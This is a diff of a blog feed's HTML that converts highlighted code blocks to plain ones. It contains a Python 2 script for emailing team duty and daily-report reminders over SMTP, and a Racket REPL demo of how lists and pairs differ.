-</span><span class="line">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
-</span><span class="line">        <span class="n">job</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-</span><span class="line">
-</span><span class="line">        <span class="c"># 值日</span>
-</span><span class="line">        <span class="k">if</span> <span class="n">job</span> <span class="o">==</span> <span class="s">&#39;duty&#39;</span><span class="p">:</span>
-</span><span class="line">            <span class="n">receiver</span> <span class="o">=</span> <span class="n">get_on_duty</span><span class="p">()</span>
-</span><span class="line">            <span class="k">print</span> <span class="n">receiver</span>
-</span><span class="line">
-</span><span class="line">            <span class="n">content_filename</span> <span class="o">=</span> <span class="s">&#39;duty.txt&#39;</span>
-</span><span class="line">            <span class="k">if</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">weekday</span><span class="p">()</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
-</span><span class="line">                <span class="n">content_filename</span> <span class="o">=</span> <span class="s">&#39;duty_Sat.txt&#39;</span>
-</span><span class="line">
-</span><span class="line">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">receiver</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">suffix</span><span class="p">):</span>
-</span><span class="line">                <span class="n">send_mail</span><span class="p">(</span><span class="n">receiver</span> <span class="o">=</span> <span class="n">receiver</span><span class="p">,</span> <span class="n">content_filename</span> <span class="o">=</span> <span class="n">content_filename</span><span class="p">)</span>
-</span><span class="line">
-</span><span class="line">        <span class="c"># 每天日报提醒</span>
-</span><span class="line">        <span class="k">elif</span> <span class="n">job</span> <span class="o">==</span> <span class="s">&#39;daily&#39;</span><span class="p">:</span>
-</span><span class="line">            <span class="n">send_mail</span><span class="p">(</span><span class="n">receiver</span> <span class="o">=</span> <span class="s">&#39;partner&#39;</span><span class="p">,</span> <span class="n">content_filename</span> <span class="o">=</span> <span class="s">&#39;daily_alert.txt&#39;</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>#coding=utf-8
+import smtplib
+import datetime
+import sys
 
-<p><br />
-            <br />
-            转载请注明原文链接
-            <a href="http://www.goorockey.com/blog/2012/09/30/python-send-mail/">http://www.goorockey.com/blog/2012/09/30/python-send-mail/</a></p>
+from email.mime.text import MIMEText
+from email.header import Header
+
+
+member = (('member1', 'member2', 'member3', 'member4', 'member5', 'member6'),
+        ('member7', 'member8', 'member9', 'member10', 'member11', 'member12'))
+
+suffix = '@abc.com'
+
+def send_mail(receiver, content_filename,
+            sender = 'admin@abc.com',
+            server = '192.168.1.1',
+            username = 'admin@abc.com',
+            password = 'admin'):
+
+    subject = ''
+    content = ''
+
+    # 从文件读取邮件正文
+    try:
+        content_file = open(content_filename, 'r')
+        try:
+            subject = content_file.readline()
+            content = content_file.read()
+
+            # 转为utf-8
+            subject = subject.decode('gbk', 'ignore').encode('utf-8')
+            content = content.decode('gbk', 'ignore').encode('utf-8')
+        finally:
+            content_file.close()
+    except IOError, e:
+        sys.stderr.write("cannot open file " + content_filename)
+        return
+
+    content = content + "\n\n系统生成，请勿回复 :)"
+    #print content
+
+    # 构造邮件
+    msg = MIMEText(content, 'plain', 'utf-8')
+    msg['Subject'] = Header(subject, 'utf-8')
+    msg['From'] = sender
+    msg['To'] = receiver
+
+
+    if (len(msg) &gt; 0):
+        try:
+            # stmp模块发送邮件
+            smtp = smtplib.SMTP()
+            smtp.connect(server)
+            smtp.login(username, password)
+            smtp.sendmail(sender, receiver, msg.as_string())
+            smtp.quit()
+
+            print "Success"
+            return True
+
+        except Exception, e:
+            print str(e)
+            return False
+
+
+def get_on_duty():
+    receiver = ''
+    days = (datetime.datetime.now() - datetime.datetime(2012,10,8)).days
+
+    if days &gt; 0:
+        days = days + 1 # 提前一天提醒
+        week = (days / 7) % 2
+        date = (days % 7)
+
+        # 周六发周一的值日
+        if date == 6:
+            date = 0
+
+        if week &lt; len(member) and date &lt; len(member[week]) and len(member[week][date]) &gt; 1:
+            receiver = member[week][date] + suffix
+
+    return receiver
+
+
+if __name__ == '__main__':
+
+    if len(sys.argv) &gt; 1:
+        job = sys.argv[1]
+
+        # 值日
+        if job == 'duty':
+            receiver = get_on_duty()
+            print receiver
+
+            content_filename = 'duty.txt'
+            if datetime.datetime.now().weekday() == 5:
+                content_filename = 'duty_Sat.txt'
+
+            if len(receiver) &gt; len(suffix):
+                send_mail(receiver = receiver, content_filename = content_filename)
+
+        # 每天日报提醒
+        elif job == 'daily':
+            send_mail(receiver = 'partner', content_filename = 'daily_alert.txt') &lt;br/&gt;
+        &lt;br/&gt;
+        转载请注明原文链接
+        &lt;a href='http://www.goorockey.com/blog/2012/09/30/python-send-mail/'&gt;http://www.goorockey.com/blog/2012/09/30/python-send-mail/&lt;/a&gt;
+</code></pre>
 
 ]]></content>
   </entry>
@@ -811,51 +642,29 @@
 
 <p>所以有：</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>cmdline </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-<span class="line-number">11</span>
-<span class="line-number">12</span>
-<span class="line-number">13</span>
-<span class="line-number">14</span>
-<span class="line-number">15</span>
-<span class="line-number">16</span>
-<span class="line-number">17</span>
-<span class="line-number">18</span>
-<span class="line-number">19</span>
-<span class="line-number">20</span>
-<span class="line-number">21</span>
-<span class="line-number">22</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">&gt; (define x '(1 2))
-</span><span class="line">&gt; x
-</span><span class="line">(1 2)
-</span><span class="line">&gt; (list? x)
-</span><span class="line">#t
-</span><span class="line">&gt; (cons? x)
-</span><span class="line">#t
-</span><span class="line">&gt; (cddr x) ; 以null结尾
-</span><span class="line">()
-</span><span class="line">
-</span><span class="line">&gt; (define y (cons 1 2))
-</span><span class="line">&gt; (list? y)
-</span><span class="line">#f
-</span><span class="line">&gt; (cons? y)
-</span><span class="line">#f
-</span><span class="line">&gt; (set-cdr! y '()) ; 把y的cdr设为null，使y变成list
-</span><span class="line">&gt; y
-</span><span class="line">(1)
-</span><span class="line">&gt; (list? y) ; 变成了list
-</span><span class="line">#t
-</span><span class="line">&gt; (cons? y)
-</span><span class="line">#t</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>&gt; (define x '(1 2))
+&gt; x
+(1 2)
+&gt; (list? x)
+#t
+&gt; (cons? x)
+#t
+&gt; (cddr x) ; 以null结尾
+()
+
+&gt; (define y (cons 1 2))
+&gt; (list? y)
+#f
+&gt; (cons? y)
+#f
+&gt; (set-cdr! y '()) ; 把y的cdr设为null，使y变成list
+&gt; y
+(1)
+&gt; (list? y) ; 变成了list
+#t
+&gt; (cons? y)
+#t
+</code></pre>
 
 <h4 id="pair">2. pair的显示规则</h4>
 
